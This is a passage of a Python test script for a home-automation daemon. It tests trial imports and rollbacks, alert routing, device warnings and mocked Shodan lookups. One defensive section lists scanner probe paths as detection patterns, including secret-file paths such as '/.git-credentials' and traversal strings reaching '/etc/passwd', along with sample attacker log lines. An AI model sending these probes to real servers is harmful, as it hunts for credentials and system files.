    d.sms_handle('+420777000998', 'how hot')
    assert len(_replies) == _n or not _replies[-1].startswith('[TEST]'), 'a command on trial answered a stranger'
    # anything that would take the place of what is in force refuses the whole file
    for _bad in ({'messages': [{'name': 'Live alert', 'text': 'x', 'level': 'info'}]},
                 {'sms_commands': [{'phrase': 'lights off now', 'reply': 'x'}]},
                 {'messages': [{'id': 'm-live', 'name': 'Other', 'text': 'x', 'level': 'info'}]},
                 {'sms_commands': [{'phrase': 'fresh one', 'reply': 'x'}],
                  'messages': [{'name': 'Live alert', 'text': 'x', 'level': 'info'}]}):
        try:
            d.trial_add(_bad, name='bad.json')
            raise AssertionError('a file that takes the place of something in force was imported: %r' % (_bad,))
        except ValueError:
            pass
        _untouched()
    assert not any(c['phrase'] == 'fresh one' for c in d.sms_commands()), 'half of a refused file went in'
    # one section refused by its own saver puts every section back
    try:
        d.trial_add({'messages': [{'id': 'm-ok', 'name': 'Fine', 'text': 'x', 'level': 'info'}],
                     'scenes': [{'name': 'Broken', 'actions': []}]}, name='half.json')
        raise AssertionError('a scene with no actions was taken')
    except ValueError:
        pass
    assert not d.message_by_id('m-ok'), 'a refused import left part of itself behind'
    # a better version of the same file replaces the trial; rolled back, the first comes back
    _f2 = json.loads(json.dumps(_f1))
    _f2['messages'][0]['text'] = 'Now it is {value}'
    _b2 = d.trial_add(_f2, name='hot-v2.json')
    assert d.trial_of('messages', 'm-hot') == _b2 and d.message_by_id('m-hot')['text'].startswith('Now')
    d.trial_rollback(_b2)
    assert d.trial_of('messages', 'm-hot') == _b1 and d.message_by_id('m-hot')['text'].startswith('It is'), \
        'rolling back the newer trial did not put the older one back'
    _untouched()
    try:
        d.trial_forget([_b1])
        raise AssertionError('an import still on trial was taken out of the history')
    except ValueError:
        pass
    d.trial_commit(_b1, by='a test')
    assert d.trial_of('rules', 'r-hot') is None
    d.rule_runtime.clear()
    d.fire_rules('dev-trial', 'dev-trial', {'temperature': 36})
    assert _fired, 'a committed rule did not act'
    _b3 = d.trial_add({'scenes': [{'id': 'sc-t', 'name': 'Trial scene',
                                   'actions': [{'target': 'notify', 'do': 'on'}]}]}, name='scene.json')
    d.trial_rollback(_b3)
    assert not any(x['id'] == 'sc-t' for x in d.scenes()), 'a rolled back scene stayed'
    assert d.message_by_id('m-hot'), 'rolling one import back took out another one committed'
    d.trial_forget([_b3])
    assert [b['id'] for b in d.trial_imports()] == [_b2, _b1], [b['id'] for b in d.trial_imports()]
    d.trial_forget('all')
    assert not d.trial_imports(), 'the history was not cleared'
finally:
    d._fire_target, d.send_message, d.sms_reply, d.sms_allowed = _real_fire, _real_send, _real_reply, _real_allowed
    for _k, _m, _g, _s, _c in d.TRIAL_SECTIONS:
        d.store.set_meta(_m, _was_lists[_k] if _was_lists[_k] is not None else '[]')
    d.store.set_meta('trial_imports', _was_trials or '[]')
    d._trial_index = None
    d.rule_runtime.clear()
print('an import on trial adds only new things, refuses a file that would change what is in force, acts on '
      'nothing until committed, and rolls back exactly what it added')


# What is on trial stays out of a backup - restored, it would have come back
# acting for real without ever being committed - and a little script can go
# on trial with the SMS command that runs it
_was_lists2 = {k: d.store.get_meta(m) for k, m, _g, _s, _c in d.TRIAL_SECTIONS}
_was_trials2 = d.store.get_meta('trial_imports')
try:
    _bt = d.trial_add({'scripts': [{'id': 'sc-trial', 'name': 'Trial script', 'body': 'notify hello'}],
                       'rules': [{'id': 'r-trial-x', 'device': 'dev-x', 'key': 'temperature', 'op': '>',
                                  'value': 40, 'plug': 'notify', 'do': 'on'}]}, name='with-script.json')
    _ex = d.export_settings(secrets=True)
    assert not any(r.get('id') == 'r-trial-x' for r in _ex['rules']), 'a rule on trial went into the backup'
    assert not any(x.get('id') == 'sc-trial' for x in _ex['scripts']), 'a script on trial went into the backup'
    assert any(x.get('id') == 'sc-trial' for x in d.scripts()), 'a little script could not go on trial'
    d.trial_rollback(_bt)
    assert not any(x.get('id') == 'sc-trial' for x in d.scripts()), 'a rolled back script stayed'
finally:
    for _k, _m, _g, _s, _c in d.TRIAL_SECTIONS:
        d.store.set_meta(_m, _was_lists2[_k] if _was_lists2[_k] is not None else '[]')
    d.store.set_meta('trial_imports', _was_trials2 or '[]')
    d._trial_index = None
print('what is on trial stays out of backups; little scripts go on trial and come out again')


# A rolled-back import goes on trial again without its file: the very items
# it added, with their ids, through the same checks; and one rolled back
# before rollbacks kept their items is found again in the kept versions
_was_lists3 = {k: d.store.get_meta(m) for k, m, _g, _s, _c in d.TRIAL_SECTIONS}
_was_trials3 = d.store.get_meta('trial_imports')
_was_snaps3 = d.store.get_meta('snapshots')
try:
    _fa = {'messages': [{'id': 'm-again', 'name': 'Again alert', 'text': 'again {value}', 'level': 'info'}],
           'scripts': [{'id': 'sc-again', 'name': 'Again script', 'body': 'notify hi'}],
           'sms_commands': [{'id': 's-again', 'phrase': 'again please', 'target': 'script:sc-again',
                             'do': 'script', 'reply': 'ok'}]}
    _ba = d.trial_add(_fa, name='again.json')
    d.trial_rollback(_ba)
    assert not d.message_by_id('m-again'), 'the rollback left an item'
    _view = next(x for x in d.trial_imports_view() if x['id'] == _ba)
    assert _view.get('again') and 'taken_out' not in _view, 'a rolled-back import cannot go on trial again: %r' % _view
    d.trial_again(_ba)
    _nb = d.trial_of('messages', 'm-again')
    assert _nb and _nb != _ba and d.trial_of('sms_commands', 's-again') == _nb \
        and d.trial_of('scripts', 'sc-again') == _nb, 'putting it on trial again did not bring every item back'
    assert d.message_by_id('m-again')['text'] == 'again {value}'
    assert next(x for x in d.trial_imports() if x['id'] == _ba).get('again_as') == _nb
    try:
        d.trial_again(_ba)
        raise AssertionError('the same rollback went on trial twice')
    except ValueError:
        pass
    # rolled back again, with what it kept thrown away: found in the kept versions
    d.trial_rollback(_nb)
    _bs = d.trial_imports()
    for _x in _bs:
        if _x['id'] == _nb:
            _x.pop('taken_out', None)
    d.store.set_meta('trial_imports', json.dumps(_bs))
    assert next(x for x in d.trial_imports_view() if x['id'] == _nb).get('again'), \
        'an older rollback was not found again in the kept versions'
    # something now in force with the same name refuses it, as a new file would be
    d.save_alert_messages(d.alert_messages() + [{'id': 'm-other', 'name': 'Again alert', 'text': 'x', 'level': 'info'}])
    try:
        d.trial_again(_nb)
        raise AssertionError('it went back on trial over something now in force')
    except ValueError:
        pass
    d.save_alert_messages([m for m in d.alert_messages() if m['id'] != 'm-other'])
    d.trial_again(_nb)
    assert d.trial_of('sms_commands', 's-again'), 'the older rollback did not go on trial again'
finally:
    for _k, _m, _g, _s, _c in d.TRIAL_SECTIONS:
        d.store.set_meta(_m, _was_lists3[_k] if _was_lists3[_k] is not None else '[]')
    d.store.set_meta('trial_imports', _was_trials3 or '[]')
    d.store.set_meta('snapshots', _was_snaps3 or '[]')
    d._trial_index = None
print('a rolled-back import goes on trial again without its file, through the same checks')


# ---------------------------------------------------------------------------
# What the front server's own logs taught (September 2026): the scanners'
# paths are known by name, the notification server's side is weighed for
# them too, a burst of the same unmistakable request is not a browser retry,
# the ones that come back later in the day are remembered, and a line of the
# error log happens when it says it did
# ---------------------------------------------------------------------------
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'block_sensitivity': 'normal', 'block_mode': 'temporary',
                      'never_block': '', 'block_ladder': '', 'feeds_ban': 0})
d.store.unblock()
d.forget_anomaly()
for _p in ('/phpinfo.php', '/info.php', '/service-account.json', '/gcp-key.json', '/docker-compose.yml',
           '/secrets.env', '/.env~', '/wp-config.php.bak', '/.git-credentials', '/litellm/config.yaml',
           '/_profiler/phpinfo', '/server.key', '/appsettings.json'):
    assert zigmon.Daemon._after_secrets(_p), 'not known as looking for secrets: %s' % _p
for _p in ('/cgi-bin/.%2e/.%2e/.%2e/bin/sh', '/..%2f..%2fetc%2fpasswd', '/....//....//etc/passwd'):
    assert zigmon.Daemon._climbing(_p), 'not known as climbing out: %s' % _p
for _p in ('/etc/passwd', '/hello.world?%ADd+allow_url_include%3d1', '/sdk', '/evox/about',
           '/phpunit/phpunit/src/Util/PHP/eval-stdin.php', '/developmentserver/metadatauploader',
           '/+CSCOE+/logon.html', '/onvif/device_service', '/containers/json'):
    assert zigmon.Daemon._known_way_in(_p), 'not known as a way in: %s' % _p
for _p in ('/tap', '/tap/uPs_JPJ1DCGGVH8tsqFWcZ3JO5uLNCBr', '/zigmon-house/json?poll=1&since=all', '/zigmon-house/auth',
           '/config.js', '/manifest.webmanifest', '/sw.js', '/settings', '/login', '/app.html', '/static/langs/en.json',
           '/v1/health', '/', '/favicon.ico', '/robots.txt', '/.well-known/acme-challenge/abc'):
    assert not (zigmon.Daemon._after_secrets(_p) or zigmon.Daemon._known_way_in(_p)), \
        'something of the house own is taken for an attack: %s' % _p

def _full(ip, path, when, status=404, which='ntfy'):
    return json.dumps({'ip': ip, 't': time.strftime('%Y-%m-%dT%H:%M:%S', time.localtime(when)) + '+02:00',
                       'm': 'GET', 'u': path, 's': status, 'which': which, 'auth': '', 'secret': ''})

_now = time.time()
# the notification server's side: its full log is weighed for the same paths
d.full_weigh([_full('64.89.161.85', '/.env', _now - 30), _full('64.89.161.85', '/js/env.js', _now - 29)])
assert '64.89.161.85' in [r['ip'] for r in d.blocked_list()], \
    'two hunts for secrets at the notification server went unweighed'
# ...and its access log, when that is the one read
d.forget_anomaly()
zigmon.CONFIG.update({'proxy_full_watch': 0})
_stamp = lambda s: time.strftime('%d/%b/%Y:%H:%M:%S %z', time.localtime(s))
d.ntfy_weigh(['146.148.34.218 - - [%s] "GET /.git/config HTTP/1.1" 404 51 "-" "Mozilla/5.0"' % _stamp(_now - 20)])
assert any(k == 'proxy-secret-hunt' for _t, k, _d in d._anomaly.get('146.148.34.218', [])), \
    'the notification server access log was not weighed for a hunt for secrets'
# five of the same unmistakable request in one second: a scanner, not a retry
d.forget_anomaly()
d.proxy_weigh(['194.180.48.253 - - [%s] "GET /.git/config HTTP/1.1" 444 0 "-" "SecurityScanner/1.0"'
               % _stamp(_now - 10)] * 5)
assert '194.180.48.253' in [r['ip'] for r in d.blocked_list()], \
    'five requests for /.git/config in one second were folded into one'
# one in the morning and one in the afternoon: remembered over the day
d.store.unblock()
d.forget_anomaly()
d.proxy_weigh(['216.81.248.83 - - [%s] "GET /.env HTTP/1.1" 404 51 "-" "x"' % _stamp(_now - 5 * 3600)])
assert '216.81.248.83' not in [r['ip'] for r in d.blocked_list()], 'one request for .env was a block'
d.proxy_weigh(['216.81.248.83 - - [%s] "GET /.git/HEAD HTTP/1.1" 404 51 "-" "x"' % _stamp(_now - 60)])
_row = next((r for r in d.blocked_list() if r['ip'] == '216.81.248.83'), None)
assert _row, 'an address back hunting for secrets five hours later was not kept out'
assert 'earlier this week' in str(_row.get('why') or ''), 'the block did not say it counted the morning: %r' % _row
# nothing of the house's own on the notification server is weighed
d.forget_anomaly()
d.full_weigh([_full('37.48.19.38', '/zigmon-house/json?poll=1&since=all', _now - 5, 200),
              _full('37.48.19.38', '/config.js', _now - 4, 404), _full('37.48.19.38', '/settings', _now - 3, 404)])
assert not d._anomaly.get('37.48.19.38'), 'the house own app was weighed: %r' % d._anomaly.get('37.48.19.38')
# a failed handshake an hour apart is a bad line, not somebody trying: the
# error log's lines are weighed when they happened, not when they were read
d.store.unblock()
d.forget_anomaly()
_was_same2, zigmon.Daemon.SAME_TRY_WITHIN = zigmon.Daemon.SAME_TRY_WITHIN, 0
d.proxy_weigh_errors(['%s [crit] 1#1: *%d SSL_do_handshake() failed (SSL: error:0A00006C:SSL routines::bad key share) '
                      'while SSL handshaking, client: 212.102.40.219, server: 0.0.0.0:443'
                      % (time.strftime('%Y/%m/%d %H:%M:%S', time.localtime(_now - 5 * 3600 + _i * 3600)), _i)
                      for _i in range(5)])
zigmon.Daemon.SAME_TRY_WITHIN = _was_same2
assert '212.102.40.219' not in [r['ip'] for r in d.blocked_list()], \
    'five failed handshakes an hour apart were weighed as if they came at once'
zigmon.CONFIG.update({'proxy_full_watch': 0})
d.store.unblock()
d.forget_anomaly()
print('the scanners in the front server logs are known by name on both servers, a burst of them is not a retry, '
      'one back later in the day is remembered, and the error log counts when things happened')


# A box read a hair under one interval ago is due: the round comes round every
# interval, give or take the scheduling of a thread, and a strip asked 14.98 s
# after its last reading used to be skipped for a whole round - read every
# 30 s, so a socket switched at the wall showed half a minute late
class _Box(object):
    pass
zigmon.CONFIG['plug_poll_interval'] = 15
_b = _Box(); _b.last_poll = time.time() - 14.98
assert zigmon.Daemon._poll_due(_b, time.time()), 'a box read just under one round ago was skipped'
_b.last_poll = time.time() - 3
assert not zigmon.Daemon._poll_due(_b, time.time()), 'a box read three seconds ago was asked again'
print('a box is read every round, not every other one')


# ---------------------------------------------------------------------------
# Every kind of alert goes where its row says: followed, switched off, or
# given its own roads - including the callers that name their own roads (a
# written message, a text from a stranger), which used to go past the row
# altogether. And the ones that were written down and never said are said.
# ---------------------------------------------------------------------------
_was_notify = d.store.get_meta('notify')
_was_q = list(d.notify_queue)
_real_kick = d._notify_kick
class _Kick(object):
    def set(self): pass
    def wait(self): pass
    def clear(self): pass
d._notify_kick = _Kick()
_was_hush = d.alerts_hushed
d.alerts_hushed = lambda: False
try:
    def _sent(about, **k):
        d.notify_queue[:] = []
        d.notify_sent.clear()
        d.notify('a test of %s' % about, 'warn', about=about, **k)
        return dict(d.notify_queue[0]) if d.notify_queue else None
    def _set(systems):
        _n = json.loads(_was_notify or '{}') if _was_notify else {}
        _n['channels'] = {'ntfy': True, 'telegram': True, 'sms': False}
        _n['systems'] = systems
        d.store.set_meta('notify', json.dumps(_n))
        d._notify_cache = None if hasattr(d, '_notify_cache') else None
    for _k, _t, _w, _g, _dflt in d.SYSTEM_ALERTS:
        _set({})
        _q = _sent(_k)
        if _dflt == 'off':
            assert _q is None, '%s is meant to start quiet, and was sent' % _k
        else:
            assert _q and _q['ntfy'] and _q['telegram'] and not _q['sms'], '%s did not follow the house: %r' % (_k, _q)
        _set({_k: {'off': True}})
        assert _sent(_k) is None, '%s switched off was still sent' % _k
        _set({_k: {'roads': 'sms'}})
        _q = _sent(_k)
        assert _q and _q['sms'] and not _q['ntfy'] and not _q['telegram'], '%s did not take its own roads: %r' % (_k, _q)
        _set({_k: {'follow': True}})
        assert _sent(_k), '%s told to follow the house was not sent' % _k
    # a written message is one of "Your own alerts", and both have to allow a road
    _set({'alert': {'roads': 'ntfy'}})
    _q = _sent('message', sms=True, ntfy=True, telegram=True)
    assert _q and _q['ntfy'] and not _q['sms'] and not _q['telegram'], \
        'a written message went past "Your own alerts": %r' % _q
    _set({'alert': {'off': True}})
    assert _sent('message', sms=True, ntfy=True, telegram=False) is None, 'a written message ignored its kind being off'
    _set({'sms_in': {'roads': 'ntfy,telegram'}})
    _q = _sent('sms_in', sms=True, ntfy=True, telegram=False)
    assert _q and not _q['sms'] and _q['ntfy'] and not _q['telegram'], 'a stranger alert went past its kind: %r' % _q
    # a test goes where it was asked, whatever the kinds say
    _set({'house': {'off': True}})
    assert _sent('test', ntfy=True, telegram=False, sms=False), 'the test message was held back by a kind'
    _set({})
    # the ones that were written down and never said
    d.notify_queue[:] = []; d.notify_sent.clear()
    d.handle_bridge(['state'], b'{"state": "online"}')
    d.handle_bridge(['state'], b'{"state": "offline"}')
    assert any('offline' in x['message'] and x['level'] == 'crit' for x in d.notify_queue), 'Zigbee2MQTT going offline was not said'
    d.handle_bridge(['state'], b'{"state": "online"}')
    assert any('back online' in x['message'] for x in d.notify_queue), 'Zigbee2MQTT coming back was not said'
    d.notify_queue[:] = []
    # somebody guessing a password (5.19; it was the PIN)
    _tries = zigmon.CONFIG.get('login_tries')
    zigmon.CONFIG.update({'login_tries': 3})
    if 'taps-owner' not in d.accounts:
        d.account_add('taps-owner', 'admin', 'owner pass 12', must_change=False, quiet=True)
    for _i in range(3):
        d.login('taps-owner', 'wrong pass 12', '10.0.0.66')
    assert any('3 times' in x['message'] for x in d.notify_queue), 'somebody guessing a password was not said'
    d._login_fails.clear()
    zigmon.CONFIG.update({'login_tries': _tries})
    d.notify_queue[:] = []
    d.login('taps-owner', 'owner pass 12', '10.0.0.9')
    assert not d.notify_queue, 'a sign-in was said while that kind is quiet by default'
    _set({'editing': {'roads': 'ntfy'}})
    d.login('taps-owner', 'owner pass 12', '10.0.0.9')
    assert any('signed in' in x['message'] and '10.0.0.9' in x['message'] for x in d.notify_queue), 'a sign-in was not said when asked for'
    # a device gone quiet says for how long, at the level of a warning
    import inspect as _insp
    _src_q = _insp.getsource(zigmon.Daemon)
    assert "'Nothing heard for %s.' % human_span(mins * 60), about=" not in _src_q, \
        'the time a device has been quiet is still passed where the level goes'
finally:
    d._notify_kick = _real_kick
    d.alerts_hushed = _was_hush
    d.notify_queue[:] = _was_q
    d.store.set_meta('notify', _was_notify or '{}')
print('every kind of alert goes where its row says, and the ones written down and never said are said')



# ---------------------------------------------------------------------------
# The warnings that became kinds of their own. Left alone, each is told
# exactly as before - as a warning, through section 2 - and given roads, it
# takes them and only them, once. And the things nothing used to tell at
# all: a leak, smoke, a battery, a room out of range, a socket protecting
# itself, the house drawing too much, the machine itself, a restart, the
# house left empty with things on.
# ---------------------------------------------------------------------------
_was_notify = d.store.get_meta('notify')
_was_q = list(d.notify_queue)
_real_kick = d._notify_kick
d._notify_kick = _Kick()
_was_hush = d.alerts_hushed
d.alerts_hushed = lambda: False
_was_cfg = {k: zigmon.CONFIG.get(k) for k in ('notify_ntfy', 'temperature_min', 'temperature_max',
                                              'humidity_max', 'battery_warn', 'battery_crit', 'alert_power_w',
                                              'alert_disk_free_pct', 'alert_memory_free_pct', 'alert_cpu_temp_c')}
zigmon.CONFIG['notify_ntfy'] = 'https://ntfy.example/x'
def _house(warn, systems):
    _n = json.loads(_was_notify or '{}') if _was_notify else {}
    _n.update({'channels': {'ntfy': True, 'telegram': True, 'sms': False}, 'warn': warn, 'crit': warn,
               'systems': systems, 'devices': {}})
    d.store.set_meta('notify', json.dumps(_n))
def _q():
    return [dict(x) for x in d.notify_queue]
def _clear():
    d.notify_queue[:] = []
    d.notify_sent.clear()
try:
    _levels = [x[0] for x in d.SYSTEM_ALERTS if x[4] == 'level']
    assert len(_levels) >= 12, 'fewer warnings with a kind of their own than were made: %r' % _levels
    assert len(d.SYSTEM_ALERTS) >= 45, 'only %d kinds of message' % len(d.SYSTEM_ALERTS)
    for _k in _levels:
        # left alone: the warnings switch decides, as it always did
        _house(True, {}); _clear()
        d.say_event('audit', 'a test of %s' % _k, 'warn', about=_k)
        assert len(_q()) == 1, '%s left alone was not told as a warning: %r' % (_k, _q())
        _house(False, {}); _clear()
        d.say_event('audit', 'a test of %s' % _k, 'warn', about=_k)
        assert not _q(), '%s left alone was told with warnings switched off: %r' % (_k, _q())
        # given a road: that road, whatever section 2 says, and once only
        _house(False, {_k: {'roads': 'sms'}}); _clear()
        d.say_event('audit', 'a test of %s' % _k, 'warn', about=_k)
        assert len(_q()) == 1 and _q()[0]['sms'] and not _q()[0]['ntfy'], '%s did not take its road: %r' % (_k, _q())
        _house(True, {_k: {'roads': 'telegram'}}); _clear()
        d.say_event('audit', 'a test of %s' % _k, 'warn', about=_k)
        assert len(_q()) == 1 and _q()[0]['telegram'] and not _q()[0]['ntfy'], \
            '%s was told twice or by the wrong road: %r' % (_k, _q())
        # switched off: written down, said nowhere, not even as a warning
        _house(True, {_k: {'off': True}}); _clear()
        _before = len(d.store.events(limit=5000))
        d.say_event('audit', 'a test of %s' % _k, 'warn', about=_k)
        assert not _q(), '%s switched off still went out as a warning: %r' % (_k, _q())
    # the other threads' warnings go on being told as they were
    _house(True, {}); _clear()
    d.store.add_event('audit', 'an ordinary warning', 'warn')
    assert len(_q()) == 1, 'an ordinary warning is no longer told: %r' % _q()
    # every one of them has somewhere that sends it (not only the list)
    _srcz = (Path(__file__).resolve().parent.parent / 'zigmon.py').read_text()
    for _k in _levels:
        assert "about='%s'" % _k in _srcz, '%s is offered and nothing sends it' % _k

    # a leak, told once when it starts and once when it ends
    _house(True, {}); _clear()
    _dev = 'leak-test-dev'
    d.watch_states(_dev, 'Leak-Test', {'water_leak': False}, {'water_leak': True})
    assert len(_q()) == 1 and _q()[0]['level'] == 'crit' and 'water leak' in _q()[0]['message'], _q()
    _clear()
    d.watch_states(_dev, 'Leak-Test', {'water_leak': True}, {'water_leak': True})
    assert not _q(), 'a leak was told again on a report that only repeats it'
    d.watch_states(_dev, 'Leak-Test', {'water_leak': True}, {'water_leak': False})
    assert len(_q()) == 1 and 'dry again' in _q()[0]['message'], _q()
    _clear()
    d.watch_states(_dev, 'Leak-Test', {}, {'smoke': 'true', 'tamper': True})
    assert len(_q()) == 2, 'smoke and a tamper were not both told: %r' % _q()
    _house(True, {'leak': {'off': True}}); _clear()
    d.watch_states(_dev + '2', 'Leak-Test', {'water_leak': False}, {'water_leak': True})
    assert not _q(), 'a leak was told with its kind switched off'
    # a battery: under the warning line once, under the critical line once,
    # not again until a new one - and not after a restart for what was
    # already low before it
    _house(True, {}); _clear()
    zigmon.CONFIG.update({'battery_warn': 30, 'battery_crit': 15})
    d.watch_states('bat-a', 'Bat', {'battery': 60}, {'battery': 28})
    assert len(_q()) == 1 and 'battery 28%' in _q()[0]['message'] and _q()[0]['level'] == 'warn', _q()
    _clear()
    d.watch_states('bat-a', 'Bat', {'battery': 28}, {'battery': 27})
    assert not _q(), 'a battery was told again on the way down'
    d.watch_states('bat-a', 'Bat', {'battery': 27}, {'battery': 14})
    assert len(_q()) == 1 and _q()[0]['level'] == 'crit', _q()
    _clear()
    d.watch_states('bat-a', 'Bat', {'battery': 14}, {'battery': 100})
    d.watch_states('bat-a', 'Bat', {'battery': 100}, {'battery': 29})
    assert len(_q()) == 1, 'a new battery running down was not told: %r' % _q()
    _clear()
    d.watch_states('bat-b', 'Bat', {'battery': 20}, {'battery': 20})
    assert not _q(), 'a battery already low before a restart was told as news'
    d.watch_states('bat-c', 'Bat', {}, {'battery_low': True})
    assert len(_q()) == 1, 'the battery-low flag was not told'
    # a room out of its range, and back
    _clear()
    zigmon.CONFIG.update({'temperature_min': 5, 'temperature_max': None, 'humidity_max': 70})
    d.watch_states('room-a', 'Sklep', {'temperature': 6}, {'temperature': 4.2})
    assert len(_q()) == 1 and 'under 5.0' in _q()[0]['message'], _q()
    _clear()
    d.watch_states('room-a', 'Sklep', {'temperature': 4.2}, {'temperature': 5.2})
    assert not _q(), 'back in range was said inside the half degree'
    d.watch_states('room-a', 'Sklep', {'temperature': 5.2}, {'temperature': 5.8})
    assert len(_q()) == 1 and 'back within' in _q()[0]['message'], _q()
    _clear()
    d.watch_states('room-a', 'Sklep', {}, {'humidity': 81})
    assert len(_q()) == 1 and 'humidity 81%' in _q()[0]['message'], _q()
    _clear()
    d.watch_states('room-b', 'Sklep', {'temperature': 3}, {'temperature': 3})
    assert not _q(), 'a room already out of range before a restart was told as news'
    # a socket protecting itself
    class _P(object):
        name = 'Plug-Test'; device_id = 'plug:Plug-Test'; output = 0
    d.watch_plug_errors(_P(), {'switch.errors': []}, {'switch.errors': ['overpower'], 'switch.output': False})
    assert len(_q()) == 1 and _q()[0]['level'] == 'crit' and 'overpower' in _q()[0]['message'] \
        and 'switched off' in _q()[0]['message'], _q()
    _clear()
    d.watch_plug_errors(_P(), {'switch.errors': ['overpower']}, {'switch.errors': ['overpower']})
    assert not _q(), 'a socket error was told again'
    d.watch_plug_errors(_P(), {}, {'switch.errors': ['overtemp']})
    assert not _q(), 'the first reading after a restart was told as news'
    # the house over its limit: twice in a row, told once
    zigmon.CONFIG['alert_power_w'] = 1000
    _pw = d.power_now
    d.power_now = lambda: {'total': 2500.0, 'sockets': 2500.0, 'lights': 0, 'sockets_on': 1, 'lights_on': 0}
    d._started_told = True
    d._power_over = 0
    d._host_at = time.time()
    d.check_system_alerts()
    assert not [x for x in _q() if 'kW' in x['message']], 'one reading over the limit was told'
    d.check_system_alerts(); d.check_system_alerts()
    assert len([x for x in _q() if 'kW' in x['message']]) == 1, _q()
    d.power_now = _pw
    zigmon.CONFIG['alert_power_w'] = 0
    # zigmon started: said once, with how long it was away
    _clear()
    _house(True, {'started': {'roads': 'ntfy'}})
    d.store.set_meta('alive_at', str(int(time.time() - 7200)))
    d._started_told = False
    d.check_system_alerts(); d.check_system_alerts()
    _st = [x for x in _q() if 'started' in x['message']]
    assert len(_st) == 1 and 'away for 2 h' in _st[0]['message'], _q()
    _clear()
    _house(True, {})
    d._started_told = False
    d.check_system_alerts()
    assert not [x for x in _q() if 'started' in x['message']], 'a restart was told while that kind starts quiet'
    # the machine itself
    zigmon.CONFIG.update({'alert_disk_free_pct': 100, 'alert_memory_free_pct': 0, 'alert_cpu_temp_c': 0})
    assert [k for k, _w in d.host_trouble()] == ['disk'], d.host_trouble()
    d._host_at = 0; d._host_told = {}
    _clear()
    d.check_system_alerts()
    assert len([x for x in _q() if 'free' in x['message']]) == 1, _q()
    d._host_at = 0; _clear()
    d.check_system_alerts()
    assert not _q(), 'the disk was told again inside six hours'
    zigmon.CONFIG.update({'alert_disk_free_pct': 0})
    assert d.host_trouble() == []
    # the last one out, with a socket still on
    _house(True, {'left_on': {'roads': 'ntfy'}}); _clear()
    _was_on = d.still_on
    d.still_on = lambda: ['Plug-Zehlicka']
    d.tell_left_on()
    assert len(_q()) == 1 and 'Plug-Zehlicka' in _q()[0]['message'], _q()
    _clear()
    d.still_on = lambda: []
    d.tell_left_on()
    assert not _q(), 'an empty house with nothing on was told'
    d.still_on = _was_on

    # The house over its power limit: told once per excursion, and told again
    # the next time it comes back down with room to spare and goes over
    # again. Staying over says nothing more, and neither does dipping into
    # the last tenth below the limit and going over from there.
    zigmon.CONFIG['alert_power_w'] = 1000
    _was_power = d.power_now
    d._started_told = True
    d._host_at = time.time()
    d._power_over = 0


    def _kw(watts):
        d.power_now = lambda: {'total': float(watts), 'sockets': float(watts), 'lights': 0,
                               'sockets_on': 1, 'lights_on': 0}


    def _said_kw():
        return [x for x in _q() if 'kW' in (x.get('message') or '')]


    _clear()
    _kw(2500); d.check_system_alerts(); d.check_system_alerts()
    assert len(_said_kw()) == 1, 'the first excursion was told %d time(s)' % len(_said_kw())
    _clear()
    d.check_system_alerts(); d.check_system_alerts()
    assert not _said_kw(), 'staying over the limit was told again and again'
    # down into the band between nine tenths and the limit, then over again
    _kw(950); d.check_system_alerts()
    _kw(2500); d.check_system_alerts(); d.check_system_alerts()
    assert not _said_kw(), 'a dip that never came back down was treated as a new excursion'
    # and properly down, then over again: that IS a new excursion
    _clear()
    _kw(100); d.check_system_alerts()
    _kw(2500); d.check_system_alerts(); d.check_system_alerts()
    assert len(_said_kw()) == 1, 'a second excursion was never told: %r' % _said_kw()
    d.power_now = _was_power
    zigmon.CONFIG['alert_power_w'] = 0
    print('the house over its limit is told once per excursion, and told again the next time')
finally:
    d._notify_kick = _real_kick
    d.alerts_hushed = _was_hush
    d.notify_queue[:] = _was_q
    d.store.set_meta('notify', _was_notify or '{}')
    zigmon.CONFIG.update(_was_cfg)
print('%d kinds of message; the warnings that became kinds go as before until given roads, and the '
      'new ones are told once each' % len(d.SYSTEM_ALERTS))


# ---------------------------------------------------------------------------
# What others know about an address: Shodan asked only when switched on, never
# about the house's own, the key never in an answer, an error or the log; an
# answer kept; Talos as its published list and its page
# ---------------------------------------------------------------------------
import urllib.request as _ur, urllib.error as _ue, io as _io
_asked = []
_real_open = _ur.urlopen
class _Resp(object):
    def __init__(self, body): self._b = body.encode()
    def read(self, n=-1): return self._b
    def __enter__(self): return self
    def __exit__(self, *a): return False
def _fake_open(req, timeout=None):
    url = req.full_url if hasattr(req, 'full_url') else str(req)
    _asked.append(url)
    if '45.9.150.9' in url:
        raise _ue.HTTPError(url, 404, 'Not Found', {}, _io.BytesIO(b'{"detail":"No information available"}'))
    if 'api.shodan.io' in url:
        if 'wrongkey' in url:
            raise _ue.HTTPError(url, 401, 'Unauthorized', {}, _io.BytesIO(b'{}'))
        return _Resp(json.dumps({'ip_str': '45.9.149.7', 'ports': [22, 443], 'org': 'Example Hosting',
                                 'os': 'Linux', 'vulns': ['CVE-2021-44228'], 'hostnames': ['x.example']}))
    return _Resp(json.dumps({'ip': '45.9.149.7', 'ports': [22, 80, 8080], 'hostnames': [],
                             'tags': ['scanner'], 'vulns': ['CVE-2019-0001', 'CVE-2020-0002'], 'cpes': ['cpe:/a:x']}))
_was_intel = {k: zigmon.CONFIG.get(k) for k in ('intel_shodan', 'intel_shodan_key', 'intel_talos', 'intel_on_block', 'never_block')}
_ur.urlopen = _fake_open
try:
    d._intel_cache = {}
    zigmon.CONFIG.update({'intel_shodan': 0, 'intel_talos': 0, 'intel_shodan_key': '', 'never_block': ''})
    _r = d.intel_for('45.9.149.7', ask=True)
    assert 'shodan' not in _r and 'talos' not in _r and not _asked, 'something was asked while both were off'
    zigmon.CONFIG.update({'intel_shodan': 1})
    _r = d.intel_for('45.9.149.7', ask=True)
    assert _asked and 'internetdb.shodan.io/45.9.149.7' in _asked[-1], 'InternetDB was not asked without a key'
    assert _r['shodan']['ports'] == [22, 80, 8080] and _r['shodan']['tags'] == ['scanner'] \
        and _r['shodan']['vulns_n'] == 2, 'the InternetDB answer was not read: %r' % _r
    _n = len(_asked)
    d.intel_for('45.9.149.7', ask=True)
    assert len(_asked) == _n, 'the same address was asked again while its answer was kept'
    d.intel_for('45.9.149.7', ask=True, force=True)
    assert len(_asked) == _n + 1, 'asking again by hand did not ask'
    assert d.intel_for('45.9.150.9', ask=True)['shodan'].get('nothing'), 'an address Shodan does not know was not said so'
    for _own in ('192.168.40.10', '10.0.0.1'):
        _n = len(_asked)
        assert d.intel_for(_own, ask=True)['shodan'].get('skipped') and len(_asked) == _n, 'a house address was sent to Shodan'
